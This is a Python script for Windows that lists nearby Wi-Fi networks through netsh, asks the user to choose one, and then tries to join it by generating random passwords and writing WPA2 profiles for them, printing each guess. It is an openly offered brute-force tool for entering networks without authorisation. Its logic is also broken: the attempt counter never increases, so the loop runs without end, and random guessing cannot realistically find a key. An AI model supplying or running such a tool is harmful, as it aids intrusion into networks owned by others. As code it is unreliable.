import subprocess
import random
import string
import time

def scan_networks():
    try:
        result = subprocess.run(['netsh', 'wlan', 'show', 'networks', 'mode=Bssid'], capture_output=True, text=True)
        output = result.stdout
        networks = []
        for line in output.split('\n'):
            line = line.strip()
            if line.startswith("SSID "):
                ssid = line.split(":", 1)[1].strip()
                if ssid and ssid not in networks:
                    networks.append(ssid)
        return networks
    except Exception as e:
        print(f"Error scanning networks: {e}")
        return []

def generate_password(length=12):
    characters = string.ascii_letters + string.digits + string.punctuation
    return ''.join(random.choice(characters) for _ in range(length))

def connect_wifi(ssid, password):
    # Remove existing profile
    subprocess.run(['netsh', 'wlan', 'delete', 'profile', f'name={ssid}'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    # Create a new profile XML
    profile_xml = f"""<?xml version="1.0"?>
    <WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
      <name>{ssid}</name>
      <SSIDConfig>
        <SSID>
          <name>{ssid}</name>
        </SSID>
      </SSIDConfig>
      <connectionType>ESS</connectionType>
      <connectionMode>auto</connectionMode>
      <MSM>
        <security>
          <authEncryption>
            <authentication>WPA2PSK</authentication>
            <encryption>AES</encryption>
            <useOneX>false</useOneX>
          </authEncryption>
          <sharedKey>
            <keyMaterial>{password}</keyMaterial>
          </sharedKey>
        </security>
      </MSM>
    </WLANProfile>"""
    profile_name = f"{ssid}.xml"
    with open(profile_name, "w") as file:
        file.write(profile_xml)
    # Add profile and connect
    try:
        subprocess.run(['netsh', 'wlan', 'add', 'profile', f'filename={profile_name}'], check=True, stdout=subprocess.DEVNULL)
        result = subprocess.run(['netsh', 'wlan', 'connect', f'name={ssid}'], capture_output=True, text=True)
        # Optional: os.remove(profile_name)
        return "success" in result.stdout.lower()
    except subprocess.CalledProcessError:
        return False

def is_connected(ssid):
    result = subprocess.run(['netsh', 'wlan', 'show', 'interfaces'], capture_output=True, text=True)
    return ssid in result.stdout

def main():
    networks = scan_networks()
    if not networks:
        print("No Wi-Fi networks found.")
        return

    print("Available Wi-Fi networks nearby:")
    for idx, ssid in enumerate(networks, 1):
        print(f"{idx}. {ssid}")

    choice = int(input(f"Select a network to connect (1-{len(networks)}): "))
    selected_ssid = networks[choice - 1]

    print(f"Trying to connect to '{selected_ssid}'...")

    attempts = 0
    max_attempts = 1

    while attempts < max_attempts:
        password = generate_password()
        
        print(f"Attempt {attempts}: Trying password: {password}")
        if connect_wifi(selected_ssid, password):
            time.sleep(1)  # Wait a bit for connection to establish
            if is_connected(selected_ssid):
                print(f"Successfully connected with password: {password}")
                break
            else:
                print("Connected attempt failed, trying another password...")
        else:
            print("Failed to add profile or connect.")
    else:
        print("Max attempts reached without success.")

if __name__ == "__main__":
    main()